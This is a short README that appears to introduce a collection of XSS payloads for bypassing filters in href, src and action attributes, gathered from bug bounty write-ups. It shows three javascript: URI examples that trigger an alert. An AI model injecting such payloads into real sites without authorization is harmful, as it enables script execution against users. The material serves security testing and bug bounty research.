# Markdown-XSS
List of XSS Payloads With Filter Bypass

If user input value directly reflected on href or src attribute at time it's worth to try this different XSS payloads. All payload are very effective and most of time it's works, you can use this payload in href, src and action attribute. This all payloads are collected from various sources such as bug bounty write ups and twitter.

## Example :- 
```html
<a href="javascript:alert(/XSS/)">click</a>
<iframe src="javascript:alert(/XSS/)"></iframe>
<form action="javascript:alert(/XSS/)"></form>
```


